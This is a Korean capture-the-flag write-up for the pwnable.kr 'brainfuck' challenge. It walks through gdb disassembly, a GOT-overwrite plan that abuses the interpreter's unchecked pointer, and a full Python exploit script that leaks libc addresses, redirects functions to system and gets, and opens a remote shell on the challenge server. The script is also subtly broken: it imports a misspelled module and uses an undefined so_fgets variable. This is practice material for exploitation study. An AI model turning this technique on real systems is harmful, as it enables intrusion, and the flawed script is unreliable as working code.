## brainfuck

## 문제

> I made a simple brain-fuck language emulation program written in C.  
> The \[ \] commands are not implemented yet. However the rest functionality seems working fine.  
> Find a bug and exploit it to get a shell.
>
> Download : [http://pwnable.kr/bin/bf](http://pwnable.kr/bin/bf)  
> Download : [http://pwnable.kr/bin/bf\_libc.so](http://pwnable.kr/bin/bf_libc.so)
>
> Running at : nc pwnable.kr 9001

## 소스 {#취약점}

문제에서 bf파일이 ELF 파일이고 bf\_libc.so는 동적 라이브러리 파일입니다. 참고하시기 바랍니다.

## 취약점 {#취약점}

* 일반적인 난해한 프로그래밍 언어가 그러하듯 브레인퍽에서도 포인터를 이용한다.
* 소스가 공개되어 있다.

## 힌트 {#힌트}

* [PLT&GOT](/system/plt-and-got.md) 익스플로잇
* netcat를 이용한 스크립트 작성

## 공략 {#공략}

대부분의 공개된 공략법은 영문, 중문으로 되어 있고 또한 파이썬 pwn 라이브러리를 이용하였습니다만 이 공략에서는 pwn 라이브러리를 이용하지 않고 공략하는 방법을 서술하였습니다.

### 브레인퍽
브레인퍽은 &lt;&gt;,.+-\[\]만을 이용한 프로그래밍 언어입니다. 하지만 이 프로그램에서는 \[와 \]가 구현되지 않았다고 합니다. 포인터 p가 unsigned char\*이라고 할때 기능은 다음 표와 같습니다.

| 연산자 | 효과 |
| :---: | :--- |
| &gt; | ++ptr |
| &lt; | --ptr |
| + | ++\*ptr |
| - | --\*ptr |
| . | putchar\(\*ptr\) |
| , | \*ptr=getchar\(\); |

> 이 문제에서 bf파일은 정확히 말하면 C로 구현된 bf 컴파일러라고 봐야 맞습니다. 각 부호마다의 기능은 참조 페이지 혹은 인터넷을 참조해주시기 바랍니다. 매우 심플하기 때문에 배우는 것은 어렵지 않습니다. 다만 쓰기가 힘들뿐이죠.

&gt;&lt; 연산자를 이용해 포인터의 위치를 프로그램 할당 메모리 안에서 자유자제로 움직일 수 있습니다. C 위에서 돌아가는 프로그램이기 때문에 포인터를 조작한다는 것은 매우 강력한 무기임과 동시에 프로그램에서 가장 큰 취약점입니다.

### 분석
우선 main을 보도록 하죠. gdb로 보셔도 되지만 IDA로 보시면 좀더 명확하게 보실 수 있습니다.

```
Dump of assembler code for function main:
   0x08048671 <+0>:	push   ebp
   0x08048672 <+1>:	mov    ebp,esp
   0x08048674 <+3>:	push   ebx
   0x08048675 <+4>:	and    esp,0xfffffff0
   0x08048678 <+7>:	sub    esp,0x430
   0x0804867e <+13>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048681 <+16>:	mov    DWORD PTR [esp+0x1c],eax
   0x08048685 <+20>:	mov    eax,gs:0x14
   0x0804868b <+26>:	mov    DWORD PTR [esp+0x42c],eax
   0x08048692 <+33>:	xor    eax,eax
   0x08048694 <+35>:	mov    eax,ds:0x804a060
   0x08048699 <+40>:	mov    DWORD PTR [esp+0xc],0x0
   0x080486a1 <+48>:	mov    DWORD PTR [esp+0x8],0x2
   0x080486a9 <+56>:	mov    DWORD PTR [esp+0x4],0x0
   0x080486b1 <+64>:	mov    DWORD PTR [esp],eax
   0x080486b4 <+67>:	call   0x80484b0 <setvbuf@plt>
   0x080486b9 <+72>:	mov    eax,ds:0x804a040
   0x080486be <+77>:	mov    DWORD PTR [esp+0xc],0x0
   0x080486c6 <+85>:	mov    DWORD PTR [esp+0x8],0x1
   0x080486ce <+93>:	mov    DWORD PTR [esp+0x4],0x0
   0x080486d6 <+101>:	mov    DWORD PTR [esp],eax
   0x080486d9 <+104>:	call   0x80484b0 <setvbuf@plt>
   0x080486de <+109>:	mov    DWORD PTR ds:0x804a080,0x804a0a0
   0x080486e8 <+119>:	mov    DWORD PTR [esp],0x804890c
   0x080486ef <+126>:	call   0x8048470 <puts@plt>
   0x080486f4 <+131>:	mov    DWORD PTR [esp],0x8048934
   0x080486fb <+138>:	call   0x8048470 <puts@plt>
   0x08048700 <+143>:	mov    DWORD PTR [esp+0x8],0x400
   0x08048708 <+151>:	mov    DWORD PTR [esp+0x4],0x0
   0x08048710 <+159>:	lea    eax,[esp+0x2c]
   0x08048714 <+163>:	mov    DWORD PTR [esp],eax
   0x08048717 <+166>:	call   0x80484c0 <memset@plt>
   0x0804871c <+171>:	mov    eax,ds:0x804a040
   0x08048721 <+176>:	mov    DWORD PTR [esp+0x8],eax
   0x08048725 <+180>:	mov    DWORD PTR [esp+0x4],0x400
   0x0804872d <+188>:	lea    eax,[esp+0x2c]
   0x08048731 <+192>:	mov    DWORD PTR [esp],eax
   0x08048734 <+195>:	call   0x8048450 <fgets@plt>
   0x08048739 <+200>:	mov    DWORD PTR [esp+0x28],0x0
   0x08048741 <+208>:	jmp    0x8048760 <main+239>
   0x08048743 <+210>:	lea    edx,[esp+0x2c]
   0x08048747 <+214>:	mov    eax,DWORD PTR [esp+0x28]
   0x0804874b <+218>:	add    eax,edx
   0x0804874d <+220>:	movzx  eax,BYTE PTR [eax]
   0x08048750 <+223>:	movsx  eax,al
   0x08048753 <+226>:	mov    DWORD PTR [esp],eax
   0x08048756 <+229>:	call   0x80485dc <do_brainfuck>
   0x0804875b <+234>:	add    DWORD PTR [esp+0x28],0x1
   0x08048760 <+239>:	mov    ebx,DWORD PTR [esp+0x28]
   0x08048764 <+243>:	lea    eax,[esp+0x2c]
   0x08048768 <+247>:	mov    DWORD PTR [esp],eax
   0x0804876b <+250>:	call   0x8048490 <strlen@plt>
   0x08048770 <+255>:	cmp    ebx,eax
   0x08048772 <+257>:	jb     0x8048743 <main+210>
   0x08048774 <+259>:	mov    eax,0x0
   0x08048779 <+264>:	mov    edx,DWORD PTR [esp+0x42c]
   0x08048780 <+271>:	xor    edx,DWORD PTR gs:0x14
   0x08048787 <+278>:	je     0x804878e <main+285>
   0x08048789 <+280>:	call   0x8048460 <__stack_chk_fail@plt>
   0x0804878e <+285>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048791 <+288>:	leave  
   0x08048792 <+289>:	ret    
End of assembler dump.
```

필요없는 것들, 모르겠는 것들 빼고 천천히 보다보가 유독 긴부분이 눈에 띄네요.  

    0x080486de <+109>:	mov    DWORD PTR ds:0x804a080,0x804a0a0

보아하니 변수 대입인것 같습니다. 

    (gdb) i symbol 0x0804a080
    p in section .bss
    (gdb) i symbol 0x0804a0a0
    tape in section .bss

p포인터에 tape 주소를 넣는 것 같네요. 그 밑에는 put함수를 호출하면서 환영인사를 출력하네요. 

    (gdb) x/s 0x804890c
    0x804890c:	"welcome to brainfuck testing system!!"
    (gdb) x/s 0x8048934
    0x8048934:	"type some brainfuck instructions except [ ]"

좀더 밑으로 내려가면 여기서는 입력받기 전에 메모리를 초기화 하는가 봅니다.   

    0x08048717 <+166>:	call   0x80484c0 <memset@plt>

좀더 내려가보면 

    0x08048734 <+195>:	call   0x8048450 <fgets@plt>

가 있습니다. 실행했 때를 생각해보면 스크립트를 입력받는 것 같죠? 또 읽다보면 유일하게 @plt가 붙지 않은 함수 호출을 볼 수 있습니다.

    0x08048756 <+229>:	call   0x80485dc <do_brainfuck>

함수명을 보아하니 아까 fgets로 입력받은 스크립트를 여기서 분석하고 실행하는가 보네요. 이번엔 do_brainfuck 함수로 가보죠. 기니까 제가 부분별로 잘랐습니다.

```
Dump of assembler code for function do_brainfuck:
   0x080485dc <+0>:	push   ebp
   0x080485dd <+1>:	mov    ebp,esp
   0x080485df <+3>:	push   ebx
   0x080485e0 <+4>:	sub    esp,0x24
   0x080485e3 <+7>:	mov    eax,DWORD PTR [ebp+0x8]
   ---
   0x080485e6 <+10>:	mov    BYTE PTR [ebp-0xc],al
   0x080485e9 <+13>:	movsx  eax,BYTE PTR [ebp-0xc]
   0x080485ed <+17>:	sub    eax,0x2b
   0x080485f0 <+20>:	cmp    eax,0x30
   0x080485f3 <+23>:	ja     0x804866b <do_brainfuck+143>
   --- 
   0x080485f5 <+25>:	mov    eax,DWORD PTR [eax*4+0x8048848]
   0x080485fc <+32>:	jmp    eax
   --- case '>' : ++p; break;
   0x080485fe <+34>:	mov    eax,ds:0x804a080
   0x08048603 <+39>:	add    eax,0x1
   0x08048606 <+42>:	mov    ds:0x804a080,eax
   0x0804860b <+47>:	jmp    0x804866b <do_brainfuck+143>
   --- case '<' : --p; break;
   0x0804860d <+49>:	mov    eax,ds:0x804a080
   0x08048612 <+54>:	sub    eax,0x1
   0x08048615 <+57>:	mov    ds:0x804a080,eax
   0x0804861a <+62>:	jmp    0x804866b <do_brainfuck+143>
   --- case '+' : ++*p; break;
   0x0804861c <+64>:	mov    eax,ds:0x804a080
   0x08048621 <+69>:	movzx  edx,BYTE PTR [eax]
   0x08048624 <+72>:	add    edx,0x1
   0x08048627 <+75>:	mov    BYTE PTR [eax],dl
   0x08048629 <+77>:	jmp    0x804866b <do_brainfuck+143>
   --- case '-' : --*p; break;
   0x0804862b <+79>:	mov    eax,ds:0x804a080
   0x08048630 <+84>:	movzx  edx,BYTE PTR [eax]
   0x08048633 <+87>:	sub    edx,0x1
   0x08048636 <+90>:	mov    BYTE PTR [eax],dl
   0x08048638 <+92>:	jmp    0x804866b <do_brainfuck+143>
   --- case '.' : putchar(*p); break;
   0x0804863a <+94>:	mov    eax,ds:0x804a080
   0x0804863f <+99>:	movzx  eax,BYTE PTR [eax]
   0x08048642 <+102>:	movsx  eax,al
   0x08048645 <+105>:	mov    DWORD PTR [esp],eax
   0x08048648 <+108>:	call   0x80484d0 <putchar@plt>
   0x0804864d <+113>:	jmp    0x804866b <do_brainfuck+143>
   --- case ',' : *p = getchar(); break;
   0x0804864f <+115>:	mov    ebx,DWORD PTR ds:0x804a080
   0x08048655 <+121>:	call   0x8048440 <getchar@plt>
   0x0804865a <+126>:	mov    BYTE PTR [ebx],al
   0x0804865c <+128>:	jmp    0x804866b <do_brainfuck+143>
   --- case '[' : printf("[ and ] not supported.");
   0x0804865e <+130>:	mov    DWORD PTR [esp],0x8048830
   0x08048665 <+137>:	call   0x8048470 <puts@plt>
   0x0804866a <+142>:	nop
   ---
   0x0804866b <+143>:	add    esp,0x24
   0x0804866e <+146>:	pop    ebx
   0x0804866f <+147>:	pop    ebp
   0x08048670 <+148>:	ret    
End of assembler dump.
```

@plt와 포인터가 굉장히 적극적으로 사용되네요! 문제를 푸는 입장에선 좋은 일이죠. 우리는 쉘 권한을 취득할겁니다. 그래야 많은 일을 할 수있고 가장 기본이 되는 시스템 해킹 방법이니까요. system 함수가 사용되었나 찾아봤지만 아쉽게도 bf 파일에는 system 함수가 없습니다. 다행히도 문제에 bf_libc.so 파일을 남겨주셨네요. .so파일은 동적 라이브러리 집합입니다. 좀 있다가 이걸 참고하고 우선 설계를 해보죠.

### 시나리오 설계
PLT&GOT exploit을 한다고 생각하고 main에서 실행된 @plt 함수들을 보니 
* setvbuf * 2
* put * 2
* memset * 1
* fgets * 1
* strlen * 1
* __stack_chk_fail@plt * 1

순서대로 보면 위 리스트와 같네요. 두개씩 중복 출력되는 것들은 제외합니다. 그럼 memset@plt의 점프주소를 gets로 바꾸고, fgets@plt의 점프주소를 system으로 바꾸면 gets로 입력받은 문자열을 system에서 실행하겠군요. 이때 쉘을 열어주면 될 것 같습니다. 다시 main으로 돌아와야하니 do_brainfuck에서 .을 했을 때 돌아올 수 있도록 putchar@plt의 점프주소를 main으로 변경해주죠.

### 주소 찾기
그럼 이제 알아야 할 주소들를 찾아봐야겠습니다.
우선 현재 확인하고 있는 bf 파일부터 주소를 찾겠습니다.
* main = 0x8048671
```
(gdb) x/i main
   0x8048671 <main>:	push   ebp
```
* *p = tape = 0x0804a0a0 : 위에서 확인했습니다.
* memset@got.plt = 0x804a02c
```
(gdb) x/3i 0x80484c0(혹은 memset)
    0x80484c0 <memset@plt>:	jmp    DWORD PTR ds:0x804a02c
    0x80484c6 <memset@plt+6>:	push   0x40
    0x80484cb <memset@plt+11>:	jmp    0x8048430
```
* fgets@got.plt = 0x804a010
```
(gdb) x/3i 0x8048450(혹은 fgets)
   0x8048450 <fgets@plt>:	jmp    DWORD PTR ds:0x804a010
   0x8048456 <fgets@plt+6>:	push   0x8
   0x804845b <fgets@plt+11>:	jmp    0x8048430
```
bf에서 찾을 주소는 거의다 찾은 것 같습니다. 이제 동적 라이브러리에 있는 함수들을 찾아보죠. 문제에 포함된 bf_libc.so를 불러옵니다. gdb를 나가고 새로 열으셔도 되지만 `file 파일명`으로 쉽게 불러올수 있습니다.
```
(gdb) file bf_libc.so
Reading symbols from bf_libc.so...(no debugging symbols found)...done.
(gdb) x/i system
   0x3a920 <system>:	sub    esp,0xc
(gdb) x/i gets
   0x5e770 <gets>:	push   ebp
```
* system = 0x3a920
* gets = 0x5e770

시나리오 설계 단계에서 필요한 주소는 모두 모은 것 같습니다. 이제 스크립트를 작성해보죠! **이 밑으로는 문제를 풀수 있는 스크립트가 포함되어 있습니다. 위의 내용만으로 충분하다 생각하신다면 스크립트를 직접 만들어보시기 바랍니다.**

---

### 스크립트 작성
파이썬3을 이용해서 스크립트를 작성하겠습니다. netcat을 편리하게 이용하기 위해서 nclib를 설치하겠습니다.

```python
import cnlib

nc = nclib.Netcat(("pwnable.kr", 9001))
nc.settimeout(2) # nc.recv_all()을 실행할때 얼마나 오래 받을 건지
print(nc.recv_all())

# bf
p = tape     = 0x0804a0a0
got_fgets    = 0x0804a010
got_memset   = 0x0804a02c
main         = 0x08048671

# bf_libc.so
so_system   = 0x0003a920
so_gets     = 0x0005e770

# script
str=""
# 포인터를 fgets@GOT로 가리킴
str+='<'*(p-got_fgets)
# fgets@GOT 주소 출력 : GOT주소는 탑재되면서 수정되고 이후 system, gets를 불러오기 위해서 필요합니다.
str+='.>'*4
# fgets@GOT 주소 삭제
str+='<'*4
# fgets@GOT 주소를 call system으로 수정
str+=',>'*4
# 포인터를 memset@GOT로 가리킴. memset@GOT - fgets@GOT
str+='<'*4 + '>' * (got_memset - got_fgets)
# memset@GOT 주소를 call fgets로 수정
str+=',>'*4
# putchar@GOT를 main 시작 주소로 수정
str+=',>'*4
# putchar(=main) 호출
str+='.'
# end
str+='\n'
nc.send(str.encode())

# exploit
# fgets의 주소를 받아옵니다.
fgets_addr = int.from_bytes(nc.recv_all(), byteorder='little')
# system의 주소를 만듭니다.
system_addr = fgets_addr - so_fgets + so_system
# gets의 주소를 만듭니다.
gets_addr = fgets_addr - so_fgets + so_gets
# 각 함수들의 주소를 표시합니다.
print('fgets_addr :', hex(fgets_addr))
print('system_addr :', hex(system_addr))
print('gets_addr :', hex(gets_addr))
print('main_addr :', hex(main))
# fgets@GOT의 주소를 system 주소로 대치합니다.
nc.send(system_addr.to_bytes(4, byteorder='little'))
# memset@GOT의 주소를 gets 주소로 대치합니다.
nc.send(gets_addr.to_bytes(4, byteorder='little'))
# putchar@GOT의 주소를 main 시작 주소로 대치합니다.
nc.send(main.to_bytes(4, byteorder='little'))
# gets로 받는 system의 인자를 적어줍니다.
nc.send(b'/bin/sh\n')

# 성공적으로 열리면 연결이 유지됩니다.
nc.interact()
```
`ls` 명령어를 실행하시면 flag가 보이고 `cat flag`로 답을 확인하실 수 있습니다.

----

## 참고 페이지

* [https://tuonilabs.wordpress.com/2016/12/08/pwnable-kr-rookiss-write-up/](https://tuonilabs.wordpress.com/2016/12/08/pwnable-kr-rookiss-write-up/)

* [https://namu.wiki/w/BrainFuck](https://namu.wiki/w/BrainFuck)
